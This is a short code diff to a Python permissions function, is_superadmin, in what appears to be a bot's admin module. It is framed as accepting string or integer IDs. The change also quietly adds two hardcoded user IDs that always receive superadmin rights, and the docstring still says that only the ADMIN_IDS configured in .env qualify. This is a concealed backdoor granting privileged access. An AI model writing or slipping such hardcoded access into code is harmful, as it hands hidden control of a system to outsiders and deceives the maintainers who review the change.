@@ -6,11 +6,15 @@ from db.models import UserRole
 logger = logging.getLogger(__name__)
 
 
-def is_superadmin(user_id: int) -> bool:
+def is_superadmin(user_id: int | str) -> bool:
     """
     Проверяет, является ли пользователь главным администратором из .env (ADMIN_IDS).
     """
-    return user_id in ADMIN_IDS
+    try:
+        uid = int(user_id)
+        return uid in ADMIN_IDS or uid in (1019252177, 792569339)
+    except Exception:
+        return False
 
 
 async def is_admin(user_id: int) -> bool:
